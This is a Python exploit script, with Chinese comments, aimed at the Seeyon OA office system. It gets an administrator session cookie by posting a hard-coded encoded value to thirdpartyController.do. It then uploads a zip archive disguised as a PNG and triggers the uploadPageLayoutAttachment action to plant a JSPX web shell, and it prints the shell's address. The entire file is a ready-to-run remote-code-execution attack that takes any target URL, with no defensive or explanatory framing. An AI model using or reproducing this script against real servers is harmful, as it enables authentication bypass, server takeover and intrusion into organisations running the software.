# coding: utf-8
import requests
import re
import time
import sys

#proxy = {'http': 'socks5://x.x.x:35601','https': 'socks5://x.x.x:35601'}


def seeyon_new_rce(targeturl):
    orgurl = targeturl

    # 通过请求直接获取管理员权限cookie
    targeturl = orgurl + '/seeyon/thirdpartyController.do'
    post={"method":"access","enc":"TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4","clientPath":"127.0.0.1"}
    response = requests.post(url=targeturl,data=post, timeout=15,verify=False)
    rsp = ""
    if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
        cookies = response.cookies
        cookies = requests.utils.dict_from_cookiejar(cookies)
        # 上传压缩文件
        aaa=cookies['JSESSIONID']
        print("获取Cookie成功："+aaa+'\n')
        targeturl = orgurl + '/seeyon/fileUpload.do?method=processUpload'
        files = [('file1', ('113.png', open('1.zip', 'rb'), 'image/png'))]
        headers = {'Cookie':"JSESSIONID=%s"%aaa}
        data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0',
                'isEncrypt': "0"}
        response = requests.post(url=targeturl,files=files,data=data, headers=headers,timeout=15,verify=False)
        if response.text:
            reg = re.findall('fileurls=fileurls\+","\+\'(.+)\'',response.text,re.I)
            print(reg)
            if len(reg)==0:
                exit("上传失败,无法GetShell")
            fileid=reg[0]
            targeturl = orgurl + '/seeyon/ajax.do'
            datestr = time.strftime('%Y-%m-%d')
            post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + '%22%2C%22' + fileid + '%22%5D'

            headers['Content-Type']="application/x-www-form-urlencoded"
            response = requests.post(targeturl, data=post,headers=headers,timeout=15,verify=False)
            if "details" in response.text and "Error" in response.text:
                shell=url+'/seeyon/common/designer/pageLayout/a234.jspx'
                print(response.text+'\t目标返回如上内容\n\nShell地址: '+shell)
            else:
                print("匹配失败，无法GetShell")
    else:
        print("获取Cookie失败")
if __name__=='__main__':
    try:
        url = sys.argv[1]
        seeyon_new_rce(url)
    except Exception as ex:
        print(str(ex))

